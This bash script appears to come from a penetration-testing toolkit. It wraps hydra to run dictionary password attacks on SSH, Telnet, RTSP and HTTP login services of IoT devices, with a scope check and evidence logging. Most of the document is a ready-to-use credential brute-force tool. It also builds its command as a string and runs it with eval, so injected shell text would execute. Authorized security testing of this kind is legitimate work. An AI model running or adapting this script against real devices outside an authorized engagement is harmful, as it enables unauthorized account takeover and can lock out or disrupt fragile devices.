#!/usr/bin/env bash
# Phase 4 — Credential brute force (session label: brute_force)
# Dictionary attacks against exposed auth services found in recon, per the catalogue
# (SSH / Telnet / HTTP / RTSP / ONVIF). Scope-guarded, marker-bracketed, evidence under runs/brute_force/.
#
# Usage (from the engagement root):
#   ./04_brute_force/brute.sh ssh    <ip> [users.txt] [pass.txt]
#   ./04_brute_force/brute.sh telnet <ip> [users.txt] [pass.txt]
#   ./04_brute_force/brute.sh rtsp   <ip> [users.txt] [pass.txt]
#   ./04_brute_force/brute.sh http-get  <ip> <path> [users.txt] [pass.txt]   # Basic/Digest-auth URL
#   ./04_brute_force/brute.sh http-form <ip> "<hydra form string>" [users.txt] [pass.txt]
#
# ATT&CK: T1110.001 (password guessing), T1110.004 (credential stuffing)
. "$(dirname "$0")/../lib.sh"

LABEL=brute_force
need() { command -v hydra >/dev/null 2>&1 || { echo "[!] hydra missing (see 01_setup)"; exit 3; }; }

# Conservative defaults — IoT auth stacks are fragile and may lock out / wedge under load.
THREADS="-t 4"          # low parallelism
WAIT="-W 1"             # wait between attempts
WL_DIR="${ENG_ROOT}/wordlists"
DEF_USERS="${WL_DIR}/users.txt"
DEF_PASS="${WL_DIR}/passwords.txt"

run_hydra() {
  local ip="$1"; shift; require_scope "$ip"; need
  local dir; dir=$(new_run "$LABEL" "$ip")
  local cmd="hydra ${THREADS} ${WAIT} -o ${dir}/hydra.txt $*"
  save_cmd "$dir" "$cmd"; echo "+ $cmd"
  echo "[i] conservative run (t=4, -W 1). If the device wedges, STOP and record it as a fragility finding."
  eval "$cmd" | tee "$dir/stdout.txt" || true
  end_run "$LABEL" "$ip"; echo ">> evidence: $dir"
}

svc() { # <ip> <users> <pass> <hydra service + args...>
  local ip="$1" users="${2:-$DEF_USERS}" pass="${3:-$DEF_PASS}"; shift 3
  run_hydra "$ip" -L "$users" -P "$pass" "$@"
}

cmd="${1:-}"; shift || true
case "$cmd" in
  ssh)       ip="$1"; svc "$ip" "${2:-}" "${3:-}" "ssh://$ip" ;;
  telnet)    ip="$1"; svc "$ip" "${2:-}" "${3:-}" "telnet://$ip" ;;
  rtsp)      ip="$1"; svc "$ip" "${2:-}" "${3:-}" "rtsp://$ip" ;;
  http-get)  ip="$1"; path="$2"; svc "$ip" "${3:-}" "${4:-}" "http-get://$ip$path" ;;
  http-form) ip="$1"; form="$2"; svc "$ip" "${3:-}" "${4:-}" "http-post-form://$ip$form" ;;
  *) sed -n '2,16p' "$0"; exit 1 ;;
esac
